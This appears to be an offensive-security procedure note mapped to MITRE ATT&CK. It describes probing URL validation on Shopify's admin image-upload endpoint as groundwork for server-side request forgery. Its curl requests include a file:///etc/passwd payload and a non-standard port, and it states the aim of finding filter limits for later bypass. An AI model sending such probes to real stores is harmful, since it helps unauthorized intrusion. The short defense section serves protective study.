---
tags:
  - ssrf
  - validation-testing
  - shopify
type: procedure
tools:
  - '[[tools/Wireshark]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/test-basic-url-validation]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:39:02.432Z'
skill_level: intermediate
impact_level: low
detection_risk: low
sub_techniques: []
id: 6a708ad3-97b7-4759-b3a4-9370de25f7be
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Test-Basic-URL-Validation-in-Shopify-Image-Insertion

## Summary

This procedure tests the URL validation in Shopify's Insert Image feature to identify restrictions on schemes and ports, laying the groundwork for SSRF exploitation.

## Description

The Shopify admin panel's /admin/settings/files.json endpoint handles image insertions for Products, Collections, and Frontpage. Initial tests reveal that non-HTTP/HTTPS schemes (e.g., file://) or non-standard ports (e.g., :8080) trigger a 422 Unprocessable Entity error due to server-side validation. This step confirms the filter's existence without bypassing it, using authenticated POST requests with various src parameters. Prerequisites include a valid Shopify admin session.

## Requirements

1. Authenticated access to Shopify admin with valid cookies and CSRF token
2. HTTP client like curl or browser dev tools
3. Knowledge of target store URL (e.g., test-4925.myshopify.com)

## Defense

Defensive measures and detection strategies:

- Implement strict URL allowlisting for schemes (HTTP/HTTPS only) and ports (80/443)
- Log all src parameter attempts and monitor for anomalous patterns like repeated port tests
- Use WAF rules to block requests with suspicious URL formats

## Objectives

1. Confirm URL validation behavior on the endpoint
2. Identify filter limitations for subsequent bypass attempts
3. Gather baseline responses for comparison in exploitation

## Instructions

### Step 1: Prepare Authenticated Session

**Context**: Obtain necessary headers including CSRF token and cookies from a logged-in Shopify admin session.

**Command** ([[commands/test-basic-url-validation]]):
```bash
curl -X POST 'https://test-4925.myshopify.com/admin/settings/files.json' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'X-CSRF-Token: F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=' \
  -H 'Cookie: COOKIES' \
  -d 'src=http://example.com:8080/image.jpg'
```

> This command sends a POST with a non-standard port URL. Expected output: HTTP/1.1 422 Unprocessable Entity, confirming validation.

### Step 2: Test Non-HTTP Scheme

**Context**: Verify scheme restrictions by attempting a non-HTTP URL.

**Command** ([[commands/test-basic-url-validation]]):
```bash
curl -X POST 'https://test-4925.myshopify.com/admin/settings/files.json' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'X-CSRF-Token: F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=' \
  -H 'Cookie: COOKIES' \
  -d 'src=file:///etc/passwd'
```

> Expected output: 422 error, indicating scheme filter activation.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/test-basic-url-validation]]

## Tools Used

- [[tools/Wireshark]]

## Tags

- ssrf
- validation-testing
